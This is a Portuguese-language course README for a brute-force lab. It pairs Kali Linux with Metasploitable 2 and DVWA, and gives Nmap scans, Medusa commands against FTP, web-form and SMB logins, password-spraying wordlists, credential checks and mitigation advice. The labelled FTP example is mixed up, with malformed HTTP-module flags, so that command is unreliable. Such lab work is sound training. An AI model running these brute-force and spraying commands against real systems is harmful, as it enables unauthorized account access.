# Desafio DIO — Kali Linux + Medusa (Força Bruta)

> Repositório modelo para entrega do desafio: implementação, documentação e evidências de ataques simulados (ambiente controlado).

---

## Sumário

1. [Objetivo](#objetivo)
2. [Topo do ambiente (visão geral)](#topologia)
3. [Pré-requisitos](#prerequisitos)
4. [Passo a passo — preparação das VMs](#preparacao)
5. [Mapeamento e reconhecimento (Nmap)](#mapeamento)
6. [Ataques com Medusa — exemplos e comandos](#ataques)

   * FTP
   * DVWA (form web)
   * SMB (password spraying / enumeração)
7. [Wordlists e scripts utilizados](#wordlists)
8. [Validação de acessos / evidências](#validacao)
9. [Recomendações de mitigação](#mitigacao)
10. [Estrutura do repositório GitHub](#repositorio)
11. [Checklist de entrega](#checklist)
12. [Referências úteis](#referencias)

---

## <a name="objetivo"></a>1. Objetivo

Criar um ambiente controlado (Kali + Metasploitable 2 / DVWA) e usar a ferramenta **Medusa** para realizar testes de força bruta em serviços comuns (FTP, formulário web, SMB). Documentar comandos, wordlists, evidências (prints / logs) e recomendações para mitigação.

> Observação: **Somente execute esses testes em ambientes que você controla ou tem permissão explícita.**

---

## <a name="topologia"></a>2. Topologia proposta

* VM 1: **Kali Linux** (atacante)
* VM 2: **Metasploitable 2** (alvo) — contém serviços vulneráveis (FTP, SMB, HTTP/DVWA)

Rede VirtualBox: **Host-only** ou **Internal Network** (recomendado: host-only) — sem acesso à internet para o alvo.

Exemplo de IPs (exemplo):

* Kali: `192.168.XXX.XXX`
* Metasploitable2: `192.168.XXX.XXX`

---

## <a name="prerequisitos"></a>3. Pré-requisitos

* Maquina virtual instalada.
* Imagens ISO/OVA: Kali Linux (última versão) e Metasploitable 2 (ou outra VM vulnerável).
* Acesso ao VirtualBox, criação de duas VMs e alteração da interface de rede para Host-only.
* No Kali: `medusa` (instalado por padrão), `nmap`, `enum4linux`, `smbclient` (opcional).

---

## <a name="preparacao"></a>4. Passo a passo — preparação das VMs

1. Crie/importe a VM Metasploitable 2 (OVA) e ligue-a.
2. Crie/importe a VM Kali Linux e ligue-a.
3. Configure em VirtualBox a interface de rede de ambas como **Host-only Adapter** (ou Internal Network) e observe os IPs com `ip a` (Linux) ou `ifconfig`.
4. No Kali, atualize pacotes (opcional):

```bash
sudo apt update && sudo apt install -y medusa nmap enum4linux smbclient
```

5. (Opcional) Instale o DVWA se preferir usar uma VM web com DVWA separada ou configure DVWA na Metasploitable (algumas imagens já vêm com vulnerable web apps).

---

## <a name="mapeamento"></a>5. Mapeamento e reconhecimento Nmap)

Comece identificando serviços e portas:

```bash
# varredura rápida e detecção de serviços
nmap -sV -Pn 192.168.XXX.XXX -oN nmap_initial.txt

# varredura mais detalhada (scripts leves)
nmap -sC -sV -p- 192.168.XXX.XXX -oN nmap_full.txt
```

Analise o `nmap_initial.txt` para ver serviços FTP (21), HTTP (80), SMB (139/445), etc.

Exemplo:

```bash
└─$ nmap -sV -Pn 192.168.XXX.XXX -oN nmap_initial.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 10:48 -03
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.65% done; ETC: 10:49 (0:00:02 remaining)
Nmap scan report for 192.168.XXX.XXX
Host is up (0.00061s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login
514/tcp  open  shell?
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
...
```
---







## <a name="ataques"></a>6. Ataques com Medusa — exemplos e comandos

> **Dica:** execute `medusa -d` para listar módulos instalados e `medusa -M <module> -q` para ver opções do módulo.

### 6.1 Preparação básica — checar módulos

```bash
# listar módulos
medusa -d

# checar opções de um módulo (ex.: ftp)
medusa -M ftp -q
```

### 6.2 Ataque FTP (usuário conhecido)

Cenário: alvo FTP na `192.168.XXX.XXX`, usuário `msfadmin` (exemplo), passwordlist local.

**Comandos**:

- Gerar passwordlist local:
  ```bash
  echo -e "msfadmin\nadmin\nuser\nftp" > ./wordlists/ftp-passwords.txt
  ```
- Gerar userlist local:
  ```bash
  echo -e "msfadmin\nadmin\nuser\nftp" > ./wordlists/users.txt
  ```

**Ataque simples**:

```bash
medusa -h 192.168.XXX.XXX -u ./wordlists/users.txt -P ./wordlists/ftp-passwords.txt -M http -t 6 \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=login failed' -10 -f -v 6
```

Explicação:

* `-M http` módulo HTTP (necessário para formulários)
* `-h` host alvo
* `-u` usuário (ou `-U users.txt` para arquivo)
* `-P` arquivo de senhas
* `-t 6` threads paralelas (ajuste conforme CPU/rede)
* `-f` parar quando credencial encontrada
* `-v 6` nível de verbosidade

**Se quiser brute force com várias contas:**

```bash
medusa -M ftp -h 192.168.XXX.XXX -U ./wordlists/users.txt -P ./wordlists/common-passwords.txt -t 16 -v 6
```

### 6.3 Ataque em formulário web (DVWA)

DVWA pode possuir formulários de login que submetem `POST` para `/login.php` (exemplo). Two common approaches:

1. Usar `medusa` com módulo `http` / `web-form` (dependendo da versão do medusa) — ou
2. Usar `hydra`, `patator` ou `burp` intruder para manipular CSRF/campos dinâmicos.

Comando de exemplo (http auth protegida por Basic Auth - diretório):

```bash
# HTTP basic auth (htaccess) exemplo
medusa -M http -h 192.168.XXX.XXX -u admin -P ./wordlists/web-words.txt -m DIR:/dvwa -t 10
```

### 6.4 SMB — enumeração de usuários e password spraying

# Enumera informações:
### SMB/LDAP/Users/Groups da máquina alvo
---
## 1) Enumere usuários com `enum4linux`:
```bash
enum4linux -a 192.168.XXX.XXX | tee enum4_output.txt
```

### Visualizar o resultado
```bash
less enum4_output.txt
```

## 2) Se tiver lista de usuários (`users.txt`), faça password spraying com Medusa (muitos alvos/contas menores número de tentativas por conta):

### arquivo com usuários
```bash
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
```
### Arquivo com senhas (corrigido para que cada senha esteja em linha separada)
```bash
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
```
> Observação: no seu histórico havia um \msfadmin (provavelmente erro de escape). No exemplo acima corrigi para \nmsfadmin (nova linha).

### 3) Password spraying com medusa (SMB)
### Execução básica de password spraying (ajuste -t conforme necessidade)
```bash
medusa -M smbnt -h 192.168.XXX.XXX -U smb_users.txt -P senhas_spray.txt -t 2 -v 4
```

### Explicação rápida das opções usadas:

`-M` smbnt : módulo SMB/NTLM.

`-h` : host alvo.

`-U` : arquivo com lista de usuários.

`-P` : arquivo com lista de senhas.

`-t 2` : threads paralelas (ajuste conforme rede / alvo).

`-v 4` : nível de verbosidade (opcional).

### Explicação:

* `-M smbnt` módulo SMB/NTLMv1 (nome do módulo em muitas instalações)
* `-U` arquivo com usuários
* `-P` arquivo com senhas

**Importante**: evite bloquear contas — em ambientes reais admin teams aplicam lockouts.

---

## <a name="wordlists"></a>7. Wordlists e scripts utilizados

Coloque suas wordlists em `/wordlists` no repositório. Exemplos básicos (mantenha curtas para demonstração):

* `users.txt` (exemplo):

```
msfadmin
admin
user
ftp
```

* `ftp-passwords.txt` (exemplo):

```
password
msfadmin
kali
toor
123456
```

* `spray-passwords.txt` (exemplo para password spraying):

```
Summer2024
Winter2024
Password123
CompanyName1
```

> Sugestão: mantenha uma versão curta no repositório para demonstração e anexe/ponha referência a wordlists maiores (ex.: SecLists) por link, por questões de tamanho.

---

## <a name="validacao"></a>8. Validação de acessos / evidências

Para cada teste, capture evidências:

* **Comando executado** (copiar/colar)
* **Output do Medusa** (stdout) mostrando credenciais encontradas
* **Screenshot** do terminal e do acesso (por ex. FTP login com `ftp` ou `smbclient`, ou acesso web após login)
* **Logs** (salve `medusa` output com redirecionamento `> medusa_ftp_output.txt`)

Exemplos de validação pós-encontro de credenciais:

```bash
# FTP — conectar com credenciais encontradas
ftp 192.168.XXX.XXX
# depois inserir usuário e senha

# SMB — conectar com smbclient
smbclient -L \\192.168.XXX.XXX -U founduser

# HTTP — acessar /dvwa/ com credenciais no browser e fazer screenshot
```

Coloque as imagens em `/images` e os logs em `/evidence`.

---

## <a name="mitigacao"></a>9. Recomendações de mitigação

1. **Política de senhas fortes**: exigir senhas longas e complexas; proibir senhas fracas e reutilizadas.
2. **Lockout e throttling**: bloqueio de conta ou throttling após X tentativas falhas; delay progressivo.
3. **MFA (2FA)**: adicionar autenticação multi-fator para serviços críticos.
4. **Monitoramento e alertas**: detectar padrão de tentativas (nº alto de tentativas por IP) e alertar equipe de segurança.
5. **Proteção de formulários web**: CSRF tokens, rate-limiting, CAPTCHAs em pontos sensíveis.
6. **Segmentação de rede**: segregar serviços críticos e limitar acesso administrativo.
7. **Remediação de serviços desnecessários**: desativar serviços não usados (p.ex. FTP/Ambient legacy).

---

## <a name="repositorio"></a>10. Estrutura sugerida do repositório GitHub

```
DIO-medusa-challenge/
├── README.md                # ESTE ARQUIVO (documentação do projeto)
├── wordlists/
│   ├── users.txt
│   ├── ftp-passwords.txt
│   └── spray-passwords.txt
├── images/                  # screenshots organizadas
│   ├── nmap.png
│   ├── medusa-ftp-output.png
│   └── dvwa-success.png
├── evidence/
│   ├── medusa_ftp_output.txt
│   └── enum4linux.txt
└── notes.md                 # observações, reflexões e aprendizados
```



## <a name="checklist"></a>11. Checklist de entrega

* [x] Assistir às aulas (marcar no DIO)
* [x] Configurar VMs e rede
* [x] Realizar scans Nmap
* [x] Executar ataques com Medusa (FTP, Web, SMB) — ou equivalentes
* [x] Salvar outputs e screenshots
* [x] Criar README.md detalhado no GitHub (este documento)
* [x] Enviar link no botão "Entregar Projeto"

---

## <a name="referencias"></a>12. Referências úteis

* Kali Linux — [https://www.kali.org](https://www.kali.org)
* Medusa man page / docs — rode `medusa -d` / `man medusa`
* DVWA — [https://dvwa.co.uk/](https://dvwa.co.uk/)
* SecLists (wordlists) — [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
* Nmap — [https://nmap.org](https://nmap.org)

---

> **DIO - Kali Linux + Medusa (Força Bruta)** -